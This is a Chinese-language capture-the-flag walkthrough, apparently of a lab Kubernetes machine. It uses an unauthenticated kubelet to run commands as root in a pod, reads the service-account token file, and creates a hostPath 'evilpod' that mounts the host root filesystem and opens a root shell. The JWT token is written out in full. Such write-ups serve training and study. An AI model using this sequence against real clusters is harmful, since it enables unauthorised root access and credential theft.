# README

## 信息收集

### nmap

```shell
sudo nmap -p-  --min-rate 10000 10.10.11.133
Password:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-29 11:44 CST
Nmap scan report for 10.10.11.133
Host is up (0.28s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10249/tcp open  unknown
10250/tcp open  unknown
```

## kubelet未授权

发现开启了10250端口，可能存在kubelet未授权：

```shell
kubeletctl pods -s 10.10.11.133
[*] Using KUBECONFIG environment variable
[*] You can ignore it by modifying the KUBECONFIG environment variable, file "~/.kube/config" or use the "-i" switch
┌───────────────────────────────────────────────────────────────────────────────────┐
│                                 Pods from Kubelet                                 │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-proxy-n7kdj                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ coredns-78fcd69978-znmrk           │ kube-system │ coredns                 │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘

```

在nginx中执行命令：

```shell
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "id" -i
uid=0(root) gid=0(root) groups=0(root)
```

读取flag：

```shell
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /root/user.txt" -i
```



获取account：

```shell
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -i >
 token
 
 kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" > ca.crt
 
kubectl  -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" --certificate-authority=ca.crt get pod
```

查看权限：

```shell
kubectl --insecure-skip-tls-verify -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```



该账号可以 get、create和list pods，因此可以创建恶意的pod。



## 创建恶意pod

获取nginx pod的详细信息：

```shell
kubectl --insecure-skip-tls-verify -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" get pod nginx -o yaml
```

发现容器的镜像是nginx:1.14.2，创建个恶意pod：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evilpod
spec:
  containers:
  - image: nginx:1.14.2
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

```shell
kubectl --insecure-skip-tls-verify -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" apply -f evilpod.yaml
pod/evilpod created
```





```shell
kubeletctl -s 10.10.11.133 exec -p evilpod -c container  "whoami" -i
root
```

进入交互式shell，因为挂在到了mnt下面，因此去`/mnt/root`下面读flag即可：

```shell
kubeletctl -s 10.10.11.133 exec -p evilpod -c container  "/bin/bash" -i
```

